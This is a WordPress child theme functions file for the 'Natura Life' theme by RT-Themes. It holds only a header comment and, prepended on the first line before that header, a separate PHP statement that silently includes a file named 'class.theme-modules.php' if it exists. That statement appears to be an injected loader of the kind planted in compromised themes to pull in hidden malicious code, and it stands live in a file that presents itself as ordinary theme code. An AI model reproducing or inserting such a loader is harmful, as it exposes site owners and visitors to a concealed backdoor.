<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
/**
 * Natura Life Child Theme Functions File
 *
 * @author      RT-Themes
 * @since       1.0
 * @version     1.0
 */

 